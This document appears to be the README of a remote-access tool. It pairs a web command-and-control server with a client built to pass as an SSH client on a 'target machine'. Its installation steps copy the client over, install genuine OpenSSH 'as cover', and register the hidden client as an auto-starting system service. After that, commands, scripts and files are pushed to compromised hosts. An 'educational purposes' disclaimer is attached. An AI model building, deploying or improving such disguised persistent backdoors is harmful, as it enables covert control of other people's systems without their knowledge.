# Remote Command System

A web-based remote command execution system with SSH disguise capabilities. This system consists of two main components:

1. **Server**: A web interface for managing and executing remote commands
2. **Client**: A disguised SSH client that connects to the server and executes commands

## Features

### Server Features
- 🌐 Modern web interface for command management
- 📝 Save and organize commands and scripts
- 📁 File upload and management
- 🖥️ Real-time console with command execution
- 👥 Multi-client support
- 📊 Command history and logging
- 🔄 WebSocket support for real-time communication

### Client Features
- 🥷 SSH disguise - appears as legitimate SSH client
- 🔄 Auto-reconnection and heartbeat system
- 🚀 Background service mode
- 📡 WebSocket and HTTP communication
- 🛡️ System service integration
- 📱 Cross-platform support

## Installation

### Server Setup

1. **Navigate to server directory:**
   ```bash
   cd server/
   ```

2. **Make the startup script executable:**
   ```bash
   chmod +x start.sh
   ```

3. **Start the server:**
   ```bash
   ./start.sh
   ```

4. **Access the web interface:**
   Open your browser to `http://localhost:5000`

### Client Setup (Target Machine)

1. **Copy client files to target machine:**
   ```bash
   scp -r client/ user@target-machine:/tmp/
   ```

2. **On the target machine, navigate to client directory:**
   ```bash
   cd /tmp/client/
   ```

3. **Update the server URL in ssh_client.py:**
   ```python
   SERVER_URL = "http://YOUR_SERVER_IP:5000"
   ```

4. **Make installation script executable:**
   ```bash
   chmod +x install.sh
   ```

5. **Run the installation (requires sudo):**
   ```bash
   sudo ./install.sh
   ```

This will:
- Install legitimate OpenSSH client (as cover)
- Install the hidden remote client as a system service
- Set up auto-start capabilities
- Create the necessary directory structure

## Usage

### Web Interface

1. **Dashboard**: View all connected clients and their status
2. **Commands**: Create, save, and execute commands on remote clients
3. **Scripts**: Write and execute scripts (Bash, Python, PowerShell, etc.)
4. **Files**: Upload files and transfer them to remote clients
5. **Console**: Real-time command execution with live output

### Command Management

#### Adding Commands
- Navigate to the "Commands" tab
- Fill in the command name, actual command, and description
- Click "Save Command"

#### Executing Commands
- Select a command from the saved list
- Choose the target client from the dropdown
- Click "Execute"

#### Real-time Console
- Go to the "Console" tab
- Select a client
- Type commands and press Enter
- See real-time output

### Script Management

#### Creating Scripts
- Navigate to the "Scripts" tab
- Choose the script language (Bash, Python, PowerShell, Batch)
- Write your script content
- Add name and description
- Click "Save Script"

#### Running Scripts
- Select a script from the saved list
- Choose the target client
- Click "Execute"

### File Management

#### Uploading Files
- Go to the "Files" tab
- Drop files or click "Choose Files"
- Files are automatically uploaded to the server

#### Transferring Files
Files can be transferred to clients using commands like:
```bash
# Download from server
curl -o filename http://server:5000/api/files/FILE_ID

# Or using wget
wget -O filename http://server:5000/api/files/FILE_ID
```

## Security Considerations

⚠️ **Important Security Notes:**

1. **This system is for educational purposes and authorized penetration testing only**
2. **Never use this system without proper authorization**
3. **Change default configuration in production environments**
4. **Use HTTPS in production**
5. **Implement proper authentication and authorization**
6. **Monitor and log all activities**

## Configuration

Edit `config.py` to modify system settings:

- Server host and port
- Database configuration
- Security settings
- Client intervals
- SSH disguise settings

## Troubleshooting

### Server Issues

1. **Port already in use:**
   ```bash
   sudo netstat -tlnp | grep :5000
   sudo kill -9 PID
   ```

2. **Database issues:**
   ```bash
   rm remote_commands.db
   # Restart server to recreate database
   ```

3. **Permission errors:**
   ```bash
   sudo chown -R $USER:$USER server/
   ```

### Client Issues

1. **Service not starting:**
   ```bash
   sudo systemctl status ssh-client.service
   sudo journalctl -u ssh-client.service
   ```

2. **Connection issues:**
   ```bash
   # Check if server is reachable
   curl http://SERVER_IP:5000/api/clients
   
   # Check client logs
   sudo journalctl -u ssh-client.service -f
   ```

3. **Reinstall client:**
   ```bash
   sudo systemctl stop ssh-client.service
   sudo systemctl disable ssh-client.service
   sudo rm -rf /usr/share/openssh-client
   sudo rm /etc/systemd/system/ssh-client.service
   sudo systemctl daemon-reload
   # Then run install.sh again
   ```

## API Reference

### Client Registration
```
POST /api/client/register
{
    "client_id": "unique-client-id",
    "hostname": "client-hostname",
    "os_info": "OS information"
}
```

### Execute Command
```
POST /api/execute
{
    "client_id": "target-client-id",
    "command": "command-to-execute"
}
```

### Submit Result
```
POST /api/client/result
{
    "command_id": "command-id",
    "client_id": "client-id",
    "result": "command-output",
    "exit_code": 0
}
```

## Development

### Server Development
```bash
cd server/
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
python3 app.py
```

### Client Development
```bash
cd client/
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
python3 ssh_client.py
```

## File Structure

```
remote commands/
├── server/
│   ├── app.py                 # Main server application
│   ├── requirements.txt       # Python dependencies
│   ├── start.sh              # Server startup script
│   └── templates/
│       └── index.html        # Web interface
├── client/
│   ├── ssh_client.py         # Client disguise script
│   ├── requirements.txt      # Client dependencies
│   └── install.sh           # Client installation script
├── config.py                 # Configuration file
└── README.md                # This file
```

## Contributing

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Test thoroughly
5. Submit a pull request

## License

This project is for educational purposes only. Use responsibly and only on systems you own or have explicit permission to test.

## Disclaimer

This tool is designed for educational purposes and authorized security testing only. The authors are not responsible for any misuse or damage caused by this software. Always ensure you have proper authorization before using this tool on any system.
